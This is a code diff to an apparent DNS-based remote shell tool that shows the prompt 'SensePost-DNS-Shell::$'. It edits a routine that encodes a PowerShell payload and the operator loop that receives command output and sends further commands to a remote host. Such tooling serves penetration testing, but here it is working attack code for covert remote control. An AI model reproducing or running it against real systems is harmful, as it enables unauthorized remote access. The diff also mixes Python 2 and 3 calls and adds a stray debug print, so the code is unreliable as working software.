@@ -16,7 +16,7 @@ def powershell_encode(data):
     blank_command = ""
     powershell_command = ""
     # Remove weird chars that could have been added by ISE
-    n = re.compile(u'(\xef|\xbb|\xbf)')
+    n = re.compile('(\xef|\xbb|\xbf)')
     # loop through each character and insert null byte
     for char in (n.sub("", data)):
         # insert the nullbyte
@@ -209,27 +209,28 @@ def main(penc, WebRequestFile=None, single=None):
             thread2.daemon = True
             thread2.start()
         else:
-            print("[+] Generated Payload:\n%s" % penc)
+            print("[+] Generated Payload:\n%s" % penc.decode())
         while thread.is_alive():
             time.sleep(1)
             sys.stdout.flush()
             sys.stderr.flush()
-        if recvConn:
-            if len(cmds) >= 1 and cmds[-1] == 'END' or newCommand:
-                newCommand = 0
-                print("\n\n%s" % ''.join(cr))
-                print("[+] Command Completed Successfully.")
-                cmds = []
-                cr = []
-                if single:
-                    s.shutdown()
-                    sys.exit()	
-                else:
-                    cmd = raw_input('SensePost-DNS-Shell::$ ')
-                if cmd == 'exit':
-                    time.sleep(5)
-                    s.shutdown()
-                    sys.exit()	
+            if recvConn:
+                if len(cmds) >= 1 and cmds[-1] == 'END' or newCommand:
+                    newCommand = 0
+                    print("\n\n%s" % ''.join(cr))
+                    print("[+] Command Completed Successfully.")
+                    cmds = []
+                    cr = []
+                    print("Stuck")
+                    if single:
+                        s.shutdown()
+                        sys.exit()	
+                    else:
+                        cmd = raw_input('SensePost-DNS-Shell::$ ')
+                    if cmd == 'exit':
+                        time.sleep(5)
+                        s.shutdown()
+                        sys.exit()	
     except KeyboardInterrupt:
         print("%s" % ''.join(cr))
         cmd = 'exit'
